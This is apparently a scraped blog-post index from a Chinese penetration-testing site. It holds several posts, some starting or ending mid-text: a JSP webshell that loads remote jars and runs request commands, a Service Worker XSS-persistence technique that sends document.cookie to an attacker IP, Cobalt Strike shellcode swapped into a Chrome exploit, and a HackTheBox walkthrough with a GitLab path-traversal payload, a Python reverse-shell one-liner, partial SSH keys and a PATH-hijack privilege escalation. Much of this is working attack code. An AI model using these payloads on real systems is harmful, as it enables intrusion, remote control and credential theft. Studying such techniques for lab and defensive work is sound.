3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A&quot;; response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString()).getBytes()); %&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 利用URLClassLoad远程加载webshell。如下园长给的一个Java连接代码。 import java.io.*; import java.net.URL; import java.net.URLClassLoader; ​ public class classload extends ClassLoader &#123; ​ public static void main(String[] args) &#123; classload loader &#x3D; new classload(); ​ try &#123; URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;); URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;); Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;); Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, &quot;whoami&quot;); ​ InputStream in &#x3D; process.getInputStream(); ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream(); byte[] buf &#x3D; new byte[2048]; int a &#x3D; 0; ​ while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123; baos.write(buf, 0, a); &#125; System.out.println(baos.toString()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; jar文件，利用jar -cvf cmd.jar cmd.class来打包为一个jar文件。 import java.io.IOException; ​ public class CMD &#123; public static Process exec(String cmd) throws IOException &#123; return Runtime.getRuntime().exec(cmd); &#125; &#125; 执行运行后，就可以执行其中写入的命令，把这个代码改为jsp并且可以远程修改执行命令的代码 &lt;%@ page import&#x3D;&quot;java.io.*, java.net.*&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;h2&gt;JSP Webshell&lt;&#x2F;h2&gt; &lt;% URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;); URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;); Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;); Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, request.getParameter(&quot;cmd&quot;)); ​ InputStream in &#x3D; process.getInputStream(); ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream(); byte[] buf &#x3D; new byte[2048]; int a &#x3D; 0; ​ while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123; baos.write(buf, 0, a); &#125; response.getOutputStream().write(String.valueOf(baos.toString()).getBytes()); %&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 如下访问即可：http://localhost:8080/jsp/1.jsp?cmd=whoami 深入分析ClassLoader工作机制 classloader详解 JVM(四)ClassLoader类加载机制","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"XSS持久化：Service Worker","slug":"XSS持久化：Service-Worker","date":"2021-06-07T09:39:30.000Z","updated":"2021-06-07T09:39:30.216Z","comments":true,"path":"2021/06/XSS持久化：Service-Worker/","link":"","permalink":"https://misakikata.github.io/2021/06/XSS%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%9AService-Worker/","excerpt":"","text":"service workerservice worker是一种特殊的web worker，web worker的作用是什么。 Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面。一旦创建， 一个worker 可以将消息发送到创建它的JavaScript代码, 通过将消息发布到该代码指定的事件处理程序（反之亦然）。 service worker是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。 并且由于service worker工作于worker上下文，因此它不能访问DOM。线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，故该特性为XSS的持久化实现提供了基础。 当然由于service worker的功能，出于安全考虑，有一些限制。 只能注册同源下的js 网站必须是https://或者http://localhost/ content-type 为 */javascript Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。 注册service worker参考：https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer 注册service worker的注册方式 ServiceWorkerContainer.register(scriptURL, options) navigator.serviceWorker.register(scriptURL, options) #返回一个ServiceWorkerContainer对象。 例如一个示例代码： if (&#39;serviceWorker&#39; in navigator) &#123; navigator.serviceWorker.register(&#39;service-worker.js&#39;, &#123;scope: &#39;.&#x2F;&#39;&#125;) .then(function(registration) &#123; document.querySelector(&#39;#status&#39;).textContent &#x3D; &#39;succeeded&#39;; &#125;).catch(function(error) &#123; document.querySelector(&#39;#status&#39;).textContent &#x3D; error; &#125;); &#125; else &#123; &#x2F;&#x2F; The current browser doesn&#39;t support service workers. let aElement &#x3D; document.createElement(&#39;a&#39;); aElement.href &#x3D; &#96; http:&#x2F;&#x2F;www.chromium.org&#x2F;blink&#x2F;serviceworker&#x2F;service-worker-faq &#96;; aElement.textContent &#x3D; &#39;unavailable&#39;; document.querySelector(&#39;#status&#39;).appendChild(aElement); &#125; 响应事件worker注册完成后，需要监听fetch事件来达到篡改返回，对页面嵌入恶意的srcipt脚本。 self.addEventListener(&#39;fetch&#39;, function(event) &#123; &#x2F;&#x2F;worker context &#125;); 利用respondwith来自定义返回的响应代码。其中包含Response对象的代码。 function(e)&#123; e.respondWith( new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;, &#123;headers: &#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125; ) ) &#125; 返回一个html的内容。 利用由于service worker存在的一定的限制，需要绕过同源，所以这里最方便的就是使用jsonp。因此需要一个jsonp的接口，并且这个接口的参数可操纵。 所以在注册的时候，需要一个jsonp的调用，例如 navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;alert(1)&#39;); 结合上面的响应，importScripts导入远程js文件。 navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;importScripts(&quot;https:&#x2F;&#x2F;xx&#x2F;test.js&quot;)&#39;); ​ &#x2F;&#x2F;test.js self.addEventListener(&#39;fetch&#39;, function(event) &#123; event.respondWith( new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;, &#123;headers: &#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125; ) ) &#125;); 本地调试一下，先本地导入这个js文件。 在刷新一下页面 在谷歌浏览器下，执行chrome://serviceworker-internals查看已经注册的service worker。能看到一个正在运行的service worker。 同样，在没有jsonp可以利用的地方，就需要查找是否有可利用的上传点，上传一个js脚本上去。直接在同源下利用即可。 如果需要无感反馈，但是service worker并不能操作document，Window对象。如下是模拟一个请求，每次触发响应的时候都会跨域发送一个请求到指定地址，但并不能携带敏感信息。 self.addEventListener(&#39;fetch&#39;, function(event) &#123; console.log(&#39;Handling fetch event for&#39;, event.request.url); ​ event.respondWith( caches.match(event.request).then(function(response) &#123; const url&#x3D;&#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;; const othePram&#x3D;&#123; headers:&#123; &quot;content-type&quot;:&quot;text&#x2F;plain&quot; &#125;, method:&quot;GET&quot;, mode: &#39;cors&#39;, credentials:&#39;include&#39; &#125;; fetch(url, othePram) .then(res&#x3D;&gt;console.log(res)) console.log(&#39;No response found in cache. About to fetch from network...&#39;); ​ return fetch(event.request).then(function(response) &#123; console.log(&#39;Response from network is:&#39;, response); return response; &#125;); &#125;) ); &#125;); 这里采用监听返回的url为特定地址的话返回修改的response。比如使用如下代码 self.addEventListener(&#39;fetch&#39;, function (event) &#123; event.respondWith( caches.match(event.request).then(function(response)&#123; console.log(fetch(event.request)); var url &#x3D; event.request.clone(); if (url.url&#x3D;&#x3D;&#39;http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;dvwa&#x2F;js&#x2F;dvwaPage.js&#39;)&#123; return new Response(&quot;var httpRequest &#x3D; new XMLHttpRequest();httpRequest.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;+document.cookie, true);httpRequest.send();&quot;) &#125;else&#123; return fetch(event.request).then(function(response) &#123; console.log(&#39;Response from network is:&#39;, response.url); ​ return response; &#125;, function(error) &#123; console.error(&#39;Fetching failed:&#39;, error); ​ throw error; &#125;); &#125; &#125;) ) &#125;); 监听是否是指定的地址，此处使用一个脚本文件，在脚本中返回一个请求来触发。但只是这样的话会破坏一个js的使用，所以可以返回原js文件的同时，再添加一个恶意的js代码到其中。 参考文章 https://paper.seebug.org/177/ https://xz.aliyun.com/t/8679 http://zerobs.top/2020/11/15/71.html https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"CobaltStrike上线Chrome 0day","slug":"CobaltStrike上线Chrome-0day","date":"2021-04-15T08:44:43.000Z","updated":"2021-04-15T08:44:43.931Z","comments":true,"path":"2021/04/CobaltStrike上线Chrome-0day/","link":"","permalink":"https://misakikata.github.io/2021/04/CobaltStrike%E4%B8%8A%E7%BA%BFChrome-0day/","excerpt":"","text":"前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下 先运行第一个poc，https://github.com/r4j0x00/exploits，此处是开启了一个本地环境。 再试一下另一个新的，chrome的修复版本90也存在影响。https://github.com/avboy1337/1195777-chrome0day 此版本的POC其中的shellcode格式很眼熟，尝试利用cobaltstrike生成C#的payload。 生成后提取其中的十六进制的shellcode字段。类似如下。 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, ...... 0xf9, 0x1f, 0x00, 0xc6, 0xf5, 0x3b, 0xd3, 0x99, 0x7b, 0x9a, 0xf4, 0xba, 0x71, 0x45, 0x52, 0x29, 0x67, 0xeb, 0x53, 0x59, 0xc5, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x31, 0x31, 0x2e, 0x31, 0x33, 0x30, 0x00, 0x12, 0x34, 0x56, 0x78 替换原exploit的shellcode字段。类似如下。 谷歌执行，会一直在加载的未响应状态，查看cs的能看到一个chrome进程的反弹shell。 但由于正常使用默认设置是沙盒环境，此漏洞并不影响，所以这个还得需要配合沙盒逃逸才有效果。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Laboratory","slug":"Laboratory","date":"2021-04-02T09:30:53.000Z","updated":"2021-04-02T09:30:53.590Z","comments":true,"path":"2021/04/Laboratory/","link":"","permalink":"https://misakikata.github.io/2021/04/Laboratory/","excerpt":"","text":"国际惯例，先执行nmap扫描 看到跳转到laboratory.htb，配置host文件，指向10.10.10.216，访问查看是个啥。 按照国际惯例第二步，查看目录。使用dirb来爆破目录，此处尝试了半天没有发现任何有用信息，只是发现可以目录浏览，https://laboratory.htb/assets/，当然下面也没有任何有用信息，都是一些css文件和图片。 目前来看没有下一步的方法，肯定是有啥没被发现。再去扫一遍端口，想看看是不是遗漏了啥，但是发现结果仍然一样，不过注意到了其中的一个DNS名称：git.laboratory.htb。 同样配置后访问发现是一个gitlab服务，需要注册一个账号。注册完成后登陆即可，然后发现一个公开的库，是刚才那个网站的前端代码，跟上面浏览的一致，也没啥 发现一个issus，提交是说服务有问题，那这个418是啥。状态代码418被定义为愚人节的笑话，并且“预计不会被实际的HTTP服务器实现”。 这就是个愚人节玩笑，难道这个有用？查了一下发现触发类似某种特定情况下，比如未知的错误会被定向到418，但是这个系统好像没有这一说。 搜一下gayhub，查到一个CVE-2020-10977，文件读取漏洞，尝试执行读取passwd查看。后续并没有找到可以帮助获取权限的敏感文件，返回基本都是400。 正好根据这个靶场看一下这个漏洞怎么执行。需要先创建两个项目，如test1，test2。 在一个项目下创建一个issus，写入如下内容 ![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd) 然后再移动这个issus到另一个项目下 然后在test2下就可以看到一个可以下载的passwd文件。 后续的RCE就是读取了/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml中的密钥 获取其中的secret_key_base： 在gayhub上又找一个RCE可以使用，利用的也是上面的文件读取来获取key，然后在构造一个payload来执行rails控制台。需要先修改一些参数。 需要监听端口，执行后监听端口反弹shell。不过这个shell及其不稳定，需要获取一个较为稳定的shell。 新建一个文件写入python的反弹shell代码，如下 import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]); 开启一个http服务，然后运行下载此文件，系统上存在的python命令是python3。 监听1234端口后，就能收到一个较为稳定的shell，在使用pty来升级一下。 当前的git用户权限并不高，也没有sudo权限。上传linpeas.sh文件，来查看一下是否有能提权的方法。 当前的可登陆用户就这几个，可能是直接获取root权限，不然就是获取别的用户权限再去获取root权限。查看一下其他用户是否能切换等。 git:x:998:998::&#x2F;var&#x2F;opt&#x2F;gitlab:&#x2F;bin&#x2F;sh gitlab-consul:x:991:991::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;consul:&#x2F;bin&#x2F;sh gitlab-prometheus:x:992:992::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;prometheus:&#x2F;bin&#x2F;sh gitlab-psql:x:996:996::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;postgresql:&#x2F;bin&#x2F;sh mattermost:x:994:994::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;mattermost:&#x2F;bin&#x2F;sh registry:x:993:993::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;registry:&#x2F;bin&#x2F;sh root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash 这几个用户并没有自己的用户目录，也不能进行查询切换等，基本是无用信息。内核为5.4版本，是多担心利用内核漏洞提权。尝试了一圈没发现能顺利提权的东西，那这个shell是给来做啥的。。。 仔细看一下发现是个docker环境，可能是docker部署的gitlab，然后我们要拿到的应该是主机的权限。 搜了一下有关的信息，看到一个rails命令，也跟shell的初始目录一致。这是一个命令行与GitLab实例进行交互的方法。Rails Runner还可以运行ruby代码。回头看一下漏洞执行代码，发现好像也是利用了这个性质来执行的ruby代码。还可以修改用户信息等，那么可以尝试一下是否能修改原来库的创建者的密码，也就是dexter 。执行的时候一直在报错，提示不正确。查一下错，发现是参数使用不正确。 使用如下执行修改密码为test123456 git@git:~&#x2F;gitlab-rails&#x2F;working$ gitlab-rails console -e production gitlab-rails console -e production -------------------------------------------------------------------------------- GitLab: 12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL: 10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0&gt; user &#x3D; User.where(username:&quot;dexter&quot;).first user &#x3D; User.where(username:&quot;dexter&quot;).first user &#x3D; User.where(username:&quot;dexter&quot;).first &#x3D;&gt; #&lt;User id:1 @dexter&gt; irb(main):002:0&gt; user.password &#x3D; &quot;test123456&quot; user.password &#x3D; &quot;test123456&quot; user.password &#x3D; &quot;test123456&quot; &#x3D;&gt; &quot;test123456&quot; irb(main):003:0&gt; user.save! user.save! user.save! Enqueued ActionMailer::DeliveryJob (Job ID: 1c4bf31e-e3f6-4056-9685-45f6a4c7d2e2) to Sidekiq(mailers) with arguments: &quot;DeviseMailer&quot;, &quot;password_change&quot;, &quot;deliver_now&quot;, #&lt;GlobalID:0x00007ff5fd3ef940 @uri&#x3D;#&lt;URI::GID gid:&#x2F;&#x2F;gitlab&#x2F;User&#x2F;1&gt;&gt; &#x3D;&gt; true irb(main):004:0&gt; 登陆后发现还有一个SecureDocker库。 在目录下找到一个dexter/.ssh目录，里面存在ssh的私钥信息。那就直接登陆查看。试了一圈发现不能登陆，一直提示格式不对，查了一圈发现这个id_rsa是新的openssh生成的新格式私钥。 内容是OPENSSH PRIVATE开头的，服务器上需要的可能不是新格式，所以我们需要转换为RSA PRIVATE格式。 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt ....... XCVyJn9QMEbE4fdpKGVF+MS&#x2F;CkfE+JaNH9KOLvMrlw0bx3At681vxUS&#x2F;VeISQyoQGLw&#x2F;fu uJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA&#x3D;&#x3D; -----END OPENSSH PRIVATE KEY----- 下载https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe，然后打开File–&gt;load private key，加载后点击conversions–&gt;export openssh key第一项导出即可。格式如下。 -----BEGIN RSA PRIVATE KEY----- MIIG4wIBAAKCAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNU ...... 5iqrf2njCLyuQRo1W4kpgWjwVMdZVwqzdn&#x2F;LQ1UaE95ppDDdwAeNS&#x2F;&#x2F;8rR24oD+b +FbxNZUCzUgDmQ0PiwOs07JtFaE+HMuickqFx5W96gOye6dLD+8u -----END RSA PRIVATE KEY----- 利用登陆查看，别忘记切换600的权限。 获取第一个用户的flag 按照惯例，先查看SUID位，发现存在一个不和谐的文件/usr/local/bin/docker-security。是一个二进制文件，执行没有反应。利用ltrace来查看一个调用跟踪。 大概就是一个限制docker权限的文件，先设置uid和gid位，后续执行chmod来调整权限。相当于用root的权限来限制。没有设置全路径，所以可以修改文件的执行目录，让先从我们设定的目录开始查找命令执行。利用环境变量来提权，参考：https://xz.aliyun.com/t/2767。现在/tmp下新建一个反弹shell，名为chmod。赋予执行权限。 监听端口后可以获取一个root的shell","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"微信小程序解包","slug":"微信小程序解包","date":"2021-03-24T07:34:27.000Z","updated":"2021-03-24T07:34:27.784Z","comments":true,"path":"2021/03/微信小程序解包/","link":"","permalink":"https://misakikata.github.io/2021/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%A7%A3%E5%8C%85/","excerpt":"","text":"认识微信小程序此处使用Windows版微信做介绍，但是Windows版和手机版稍微有点区别。先去获取一个Windows版的微信小程序包。默认位置在：C:\\Users\\user\\Documents\\WeChat Files\\Applet。移动端的包在/data/data/com.tencent.mm/MicroMsg/&#123;id&#125;/appbrand/pkg，此处没有移动设备，不使用移动设备做演示。 目录下有一堆wx开头的目录，这些ID就是对应的小程序ID，可以在访问小程序抓包中获取到，如果懒得抓包也不知道小程序ID就把这些删掉，重新访问会再次下载，根据日期来找到对应的包即可。 Windows版的小程序包自动在外部加了一层的加密，我们看到的包名统一为：__APP__.wxapkg。我们可以看到这样的文件头，V1MMWX标识就是加密后添加的标识。 这个是需要解密的，借助大佬的go语音项目来解密：https://github.com/BlackTrace/pc_wxapkg_decrypt，同时也有编译后的程序，直接用即可。 那Windows版的小程序的加密流程为： 首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为saltiest 迭代次数为1000。调用pbkdf2生成一个32位的key 首先取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(the iv: 16 bytes),进行加密 接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 0x66 把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加V1MMWX标识 解密后，就能获得一个以微信小程序ID命令的包，这个包就是需要解析来获取小程序源码的包。先来看一下小程序的结构。 从十六进制中可以看到，旁边的文件目录文件。这种包并非一个压缩格式的包，而是一个二进制的包，需要特定的方法解包。 小程序解包使用工具：https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad 执行：python3 python.py wxid.wxapkg，可以看到目录下生成的微信id的目录包。 或者使用：https://github.com/xuedingmiaojun/wxappUnpacker，一个nodejs的项目。提供Windows的安装版。 获取到小程序的源码格式包的时候，跟原来的源码还是稍微有点区别。在一级目录下，可以看到有三个文件，实际上不同的解包工具看到的不一样，有时候是四个文件。 app-service.js app-config.json page-frame.html &#x2F;&#x2F;app.js app-service.js是所以js的汇总，只是微信把js都压缩到这个js内。 app-config.json: 小程序工程 app.json 以及各个页面的 JSON 配置文件汇总，可直接查看； page-frame.html: 所有页面的 .wxml 和 app.wxss 样式文件的汇总； *.html: 包含每个页面对应的 .wxss 信息，可读性较好； static: 各类图片、音频等资源文件。 获取解包后，小程序源码有什么用？ 小程序内的信息泄露有一部分开发者会把Appid和Secret放在小程序内请求，比如如下的开发者 如果这个appid和secret可以使用，就能获取到seesion_key。借用官方的登陆流程。 所以需要code和appid还有secret，code如何获取，只需要使用带有登陆功能的点，需要触发了wx.login()功能，点击登陆抓包即可。 一般打开小程序的时候就有流量交互了。比如，但这个code只能使用一次 构造一个请求，查看小程序官方文档：https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/login/auth.code2Session.html curl https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;jscode2session?appid&#x3D;wxxxxx&amp;secret&#x3D;568wdxxx&amp;js_code&#x3D;041xxxx&amp;grant_type&#x3D;authorization_code 为了方便，此处使用云函数功能测试，需要小程序开启云函数。使用python的第三方包python-weixin。但云函数功能不一定都开放，需要小程序开放才能查询。 from os import environ, path from weixin import WxAppCloudAPI ​ appid &#x3D; environ.get(&quot;WXAPP_APPID&quot;, &quot;wx88xxxxx&quot;) secret &#x3D; environ.get(&quot;WXAPP_SECRET&quot;, &quot;56xxxxx&quot;) env &#x3D; &quot;test-id&quot; ​ example_db &#x3D; path.abspath(path.join(path.dirname(__file__), &quot;.&#x2F;example_db&quot;)) app_cloud &#x3D; WxAppCloudAPI( appid&#x3D;appid, app_secret&#x3D;secret, grant_type&#x3D;&quot;client_credential&quot; ) token &#x3D; app_cloud.client_credential_for_access_token().get(&quot;access_token&quot;) print(token) ​ cloud_api &#x3D; WxAppCloudAPI(access_token&#x3D;token) # 获取库的集合信息 db_info &#x3D; cloud_api.db_collection_info(json_body&#x3D;&#123;&quot;env&quot;: env, &quot;limit&quot;: 10&#125;) print(db_info) 根据包的wiki来利用云函数操作小程序，文档：https://github.com/gusibi/python-weixin/wiki/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%91%E5%BC%80%E5%8F%91 利用accesstoken获取session_key是用户数据的加密密钥，那accesstoken就是操作小程序的调用凭证。 先获取accesstoken，也可以利用上面提到的代码来获取accesstoken。 https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;token?grant_type&#x3D;client_credential&amp;appid&#x3D;APPID&amp;secret&#x3D;APPSECRET 获取到token后可以利用官方的接口操作小程序来查询等操作，比如查询最近一天的访问 https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;datacube&#x2F;getweanalysisappidvisitpage?access_token&#x3D;ACCESS_TOKEN data &#x3D; &#123;&quot;begin_date&quot; : &quot;20170313&quot;,&quot;end_date&quot; : &quot;20170313&quot;&#125; 其他查询接口查看：https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/access-token/auth.getAccessToken.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"又叒一个代理扫描平台","slug":"又叒一个代理扫描平台","date":"2021-01-13T08:25:40.000Z","updated":"2021-01-13T08:35:48.644Z","comments":true,"path":"2021/01/又叒一个代理扫描平台/","link":"","permalink":"https://misakikata.github.io/2021/01/%E5%8F%88%E5%8F%92%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B3%E5%8F%B0/","excerpt":"","text":"关于项目 项目是一个代理扫描器，现有的代理扫描平台有xray，w13scan等，只是我希望关于SQL注入的使用sqlmap来检测执行，所以就有了这个平台，本质上和GroudScan是差不多的，只是把w13scan也加入到其中来检测别的漏洞。 同时也期望这个东西能做到代理扫描上的统一化，在实际工作中，开发测试对于新功能并不会实时进行安全申报，所以希望平台化的被动扫描可以帮助实现安全的加固。 地址：https://github.com/MisakiKata/mitescan 安装 环境使用MySQL，建议手动调整连接超时时间，代码会检测连接是否超时，但是可以调整超时来延缓长连接。不修改本质上也没事。 安装，基于python3.7 mitmproxy apscheduler django-apscheduler django&#x3D;&#x3D;2.2.10 django-simpleui PyMySQL secrets asn1crypto&#x3D;&#x3D;0.24.0 certifi&#x3D;&#x3D;2019.6.16 cffi&#x3D;&#x3D;1.12.3 chardet&#x3D;&#x3D;3.0.4 colorama&#x3D;&#x3D;0.4.1 cowpy&#x3D;&#x3D;1.1.0 cryptography&#x3D;&#x3D;2.7 cssselect&#x3D;&#x3D;1.1.0 idna&#x3D;&#x3D;2.8 lxml&#x3D;&#x3D;4.5.0 pycparser&#x3D;&#x3D;2.19 pyjsparser&#x3D;&#x3D;2.7.1 pyOpenSSL&#x3D;&#x3D;18.0.0 PySocks&#x3D;&#x3D;1.7.1 requests&#x3D;&#x3D;2.24.0 requests-toolbelt&#x3D;&#x3D;0.9.1 six&#x3D;&#x3D;1.12.0 tld&#x3D;&#x3D;0.9.3 urllib3&#x3D;&#x3D;1.25.3 代理模块使用mitmproxy，如果需要代理https，请在开启代理后访问地址http://mitm.it/下载证书，默认代理为0.0.0.0:18088。如需修改在myproxy/myproxys.py中修改。 需要开启sqlmapapi python sqlmapapi.py -s 为了避免流量数据堆积，只显示最近三天的流量，检索也是按照最近三天检索，如果需要修改apps/proxy/views.py中修改timedelta(days=3)为想要的天数。 使用配置setting的数据库信息 python manage.py makemigrations python manage.py migrate python manage.py createsuperuser python manage.py runserver 0.0.0.0:8000 访问地址ip:8000即可，如需维持进程，可以使用supervisor。 监控前台 监控选项注入的结果使用的apscheduler任务框架来定时检索，默认是一分钟执行一次。所以请开启，不然不会检查是否注入完成。如果需要修改时间请到apps/sqli/views.py中，修改minutes=1为需要的分钟。 代理数据关于搜索，需要输入请求的地址和端口来检测，也可以只输入一个值，但如果是ip加端口的形式，需要分开来一起搜索。 代理设置请在其中添加修改需要过滤的代理请求关键词，所有添加的参数都会按照并集来处理。 